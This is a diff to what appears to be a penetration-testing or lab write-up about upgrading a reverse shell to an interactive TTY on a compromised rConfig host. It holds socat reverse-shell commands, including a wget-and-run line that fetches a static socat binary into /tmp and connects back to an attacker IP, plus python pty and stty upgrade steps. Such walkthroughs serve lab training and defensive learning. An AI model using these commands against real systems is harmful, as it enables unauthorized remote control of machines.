@@ -2480,53 +2480,69 @@ sh-4.2$ pwd
 /home/rconfig/www/images/vendor
 ```
 
-#### Method 2: Alternative TTY Methods
+#### Method 2: Socat Full TTY
 
-**Using Script Command:**
+Socat passes a full TTY over TCP — tab-complete, Ctrl-C, job control, all work. Requires catching the connection with socat as well.
+
+**Attacker (listener):**
 
 ```bash wrap
-script -qc /bin/bash /dev/null
+socat file:`tty`,raw,echo=0 tcp-listen:4444
 ```
 
-**Using Expect:**
+**Victim:**
 
 ```bash wrap
-expect -c "spawn $SHELL; interact"
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$IP:4444
 ```
 
-**Using Socat (if available):**
+If socat isn't on the victim, download a static binary and run in one line:
 
 ```bash wrap
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.111:4445
+wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$IP:4444
 ```
 
-#### Method 3: Full Interactive TTY
+#### Method 3: stty Magic (netcat upgrade)
 
-**Step 1: Initial PTY spawn**
+Upgrades an existing netcat dumb shell to a full interactive TTY without needing socat on the victim. Input will be invisible during step 3 — that is expected.
+
+**Step 1: Spawn a PTY inside the shell**
 
 ```bash wrap
+python -c 'import pty; pty.spawn("/bin/bash")'
+# or python3
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-**Step 2: Background the session**
+**Step 2: Background it, check your terminal dimensions**
 
 ```bash wrap
-# Press Ctrl+Z to background
+# Ctrl-Z to background the shell
+stty -a   # note the rows and columns values
+echo $TERM  # note TERM type, e.g. xterm-256color
 ```
 
-**Step 3: Configure local terminal**
+**Step 3: Set raw mode and foreground**
 
 ```bash wrap
-stty raw -echo && fg
+stty raw -echo
+fg
 ```
 
-**Step 4: Reset terminal**
+**Step 4: Reset and configure the remote shell**
 
 ```bash wrap
 reset
 export SHELL=bash
 export TERM=xterm-256color
-stty rows <rows> columns <columns>
+stty rows <rows> columns <columns>   # use values from step 2
+```
+
+#### Other one-liners
+
+```bash wrap
+script -qc /bin/bash /dev/null
+expect -c "spawn $SHELL; interact"
 ```
 
 ## Linux Shell Environments
